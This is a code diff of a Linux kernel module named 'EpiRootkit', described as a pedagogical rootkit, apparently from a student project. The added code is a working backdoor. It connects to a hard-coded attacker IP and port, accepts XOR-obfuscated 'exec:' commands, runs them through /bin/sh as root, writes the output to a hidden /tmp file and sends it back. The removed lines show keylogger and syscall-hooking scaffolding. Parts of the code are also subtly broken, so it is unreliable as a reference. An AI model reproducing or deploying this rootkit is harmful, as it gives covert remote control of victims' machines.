@@ -1,4 +1,4 @@
-// filepath: c:\Users\Admin\Documents\GitHub\epizut\rootkit\epirootkit.c
+// filepath: c:\\Users\\Admin\\Documents\\GitHub\\epizut\\rootkit\\epirootkit.c
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -16,137 +16,116 @@
 #include <linux/list.h>
 #include <linux/version.h>
 #include <linux/cred.h>
-#include <linux/input.h>
 #include <linux/namei.h>
-#include <linux/inet.h> // For inet_addr (alternative to in_aton)
+#include <linux/inet.h>
+#include <net/sock.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Team_Rodrien");
 MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
-MODULE_VERSION("0.3"); // Incremented version
+MODULE_VERSION("0.3");
 
-/* Configuration améliorée */
 static struct rootkit_config {
     unsigned short port;
     char server_ip[16];
     size_t buffer_size;
     char xor_key[32];
-    char temp_output_file[64];
-    char hidden_dir[64];
-    int max_hidden_lines;
 } config = {
     .port = 4242,
-    .server_ip = "192.168.15.6", // Ensure this is the ATTACKER's IP
-    .buffer_size = 2048, // Increased buffer size
-    .xor_key = "epirootkit",
-    .temp_output_file = "/tmp/.rk_out",
-    .hidden_dir = "/.rk_hidden",
-    .max_hidden_lines = 100
+    .server_ip = "192.168.15.6",
+    .buffer_size = 2048,
+    .xor_key = "epirootkit"
 };
 
-/* Structure simplifiée pour le keylogger */
-struct keylogger {
-    char *buffer;
-    size_t size;
-    size_t pos;
-    spinlock_t lock;
-    struct task_struct *thread;
-    bool active;
-};
-
-/* Variables globales */
 static struct socket *g_sock = NULL;
-static struct task_struct *g_main_thread = NULL;
-static struct keylogger g_keylog; // Keylogger functionality not fully implemented in this snippet
-static bool g_authenticated = false;
-static char g_password[32] = "epita";
-static LIST_HEAD(g_hidden_lines); // For hiding lines in files (not fully implemented here)
-static DEFINE_SPINLOCK(g_hidden_lines_lock);
+static struct task_struct *g_thread = NULL;
 
-/* Pointeurs originaux des syscalls */
-// Ensure these types match the actual syscall signatures on your kernel version
-typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
-typedef asmlinkage long (*orig_read_t)(unsigned int, char __user *, size_t);
-typedef asmlinkage long (*orig_write_t)(unsigned int, const char __user *, size_t);
-
-static orig_getdents64_t orig_getdents64;
-static orig_read_t orig_read;
-static orig_write_t orig_write;
-
-// Syscall table address - this needs to be found reliably
-// For older kernels, it might be exported. For newer, kallsyms_lookup_name is needed.
-// This is a placeholder; direct assignment might not work or be unsafe.
-// For this example, we assume sys_call_table is a pre-resolved pointer.
-extern void *sys_call_table[];
-
-
-/* Fonction pour appliquer le chiffrement XOR */
 static void xor_cipher(char *data, size_t len) {
-    const size_t key_len = strlen(config.xor_key);
-    size_t i;
-
-    if (key_len == 0) return; // Avoid division by zero if key is empty
-    for (i = 0; i < len; i++) {
+    size_t key_len = strlen(config.xor_key);
+    for (size_t i = 0; i < len; i++)
         data[i] ^= config.xor_key[i % key_len];
-    }
 }
 
-/* Fonction pour envoyer des données au serveur */
-static int send_data(const char *data) {
-    struct msghdr msg = {0};
-    struct kvec vec;
-    int ret;
-    size_t data_len;
-    char *encrypted_data = NULL;
-
-    if (!g_sock) {
-        printk(KERN_WARNING "EpiRootkit: send_data: No socket.\n");
-        return -ENOTCONN;
-    }
-    if (!data) {
-        printk(KERN_WARNING "EpiRootkit: send_data: NULL data.\n");
-        return -EINVAL;
-    }
-
-    data_len = strlen(data);
-    if (data_len == 0) {
-        return 0; // Nothing to send
-    }
-
-    encrypted_data = kmalloc(data_len + 1, GFP_KERNEL); // +1 for null terminator if needed, though XOR doesn't expand
-    if (!encrypted_data) {
-        printk(KERN_ERR "EpiRootkit: send_data: kmalloc failed.\n");
-        return -ENOMEM;
-    }
-
-    memcpy(encrypted_data, data, data_len);
-    encrypted_data[data_len] = '\0'; // Ensure null termination before strlen if used by xor_cipher implicitly
-    xor_cipher(encrypted_data, data_len);
-
-    vec.iov_base = encrypted_data;
-    vec.iov_len = data_len;
-
-    // It's important that the socket is in a connected state.
-    // kernel_sendmsg doesn't check for MSG_NOSIGNAL in flags, set in msg.msg_flags
-    msg.msg_flags = MSG_NOSIGNAL; // Prevent SIGPIPE on client disconnect
-
-    ret = kernel_sendmsg(g_sock, &msg, &vec, 1, data_len);
-    kfree(encrypted_data);
-
-    if (ret < 0) {
-        printk(KERN_ERR "EpiRootkit: kernel_sendmsg error: %d\n", ret);
-    }
-    return ret;
+static int send_data(const char *msg, size_t len) {
+    struct msghdr msg_hdr = { 0 };
+    struct kvec iov = { .iov_base = (char *)msg, .iov_len = len };
+    return kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
 }
 
-/* Fonction pour exécuter une commande et renvoyer le résultat */
-static void exec_command(const char *cmd) {
-    char *argv[] = {"/bin/sh", "-c", NULL, NULL}; // Command will be third arg
-    char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};
-    int ret;
-    struct file *outfile;
-    char *output_buffer;
-    mm_segment_t old_fs;
-    loff_t offset = 0;
+static int receive_data(char *buf, size_t len) {
+    struct msghdr msg_hdr = { 0 };
+    struct kvec iov = { .iov_base = buf, .iov_len = len };
+    return kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, len, 0);
+}
 
-    if (!cmd || !*cmd) {
+static int command_loop(void *data) {
+    char *buf = kmalloc(config.buffer_size, GFP_KERNEL);
+    if (!buf) return -ENOMEM;
+
+    while (!kthread_should_stop()) {
+        memset(buf, 0, config.buffer_size);
+        int ret = receive_data(buf, config.buffer_size - 1);
+        if (ret <= 0) {
+            msleep(3000);
+            continue;
+        }
+
+        xor_cipher(buf, ret);
+        if (strncmp(buf, "exec:", 5) == 0) {
+            struct file *fp;
+            mm_segment_t old_fs;
+            char *cmd = buf + 5;
+            char output[2048] = {0};
+            snprintf(output, sizeof(output), "/bin/sh -c '%s' > /tmp/.rk_tmp 2>&1", cmd);
+            call_usermodehelper_setup("/bin/sh", (char *[]) {"sh", "-c", output, NULL}, NULL, GFP_KERNEL);
+            old_fs = get_fs();
+            set_fs(KERNEL_DS);
+            fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
+            if (!IS_ERR(fp)) {
+                ret = kernel_read(fp, output, sizeof(output) - 1, &fp->f_pos);
+                filp_close(fp, NULL);
+                xor_cipher(output, ret);
+                send_data(output, ret);
+            }
+            set_fs(old_fs);
+        }
+    }
+
+    kfree(buf);
+    return 0;
+}
+
+static int connect_to_server(void) {
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_port = htons(config.port),
+        .sin_addr.s_addr = in_aton(config.server_ip)
+    };
+
+    int ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
+    if (ret < 0) return ret;
+
+    while ((ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0)) < 0) {
+        msleep(3000);
+    }
+
+    return 0;
+}
+
+static int __init rk_init(void) {
+    int ret = connect_to_server();
+    if (ret < 0) return ret;
+
+    g_thread = kthread_run(command_loop, NULL, "rk_cmd_thread");
+    if (IS_ERR(g_thread)) return PTR_ERR(g_thread);
+
+    return 0;
+}
+
+static void __exit rk_exit(void) {
+    if (g_thread) kthread_stop(g_thread);
+    if (g_sock) sock_release(g_sock);
+}
+
+module_init(rk_init);
+module_exit(rk_exit);
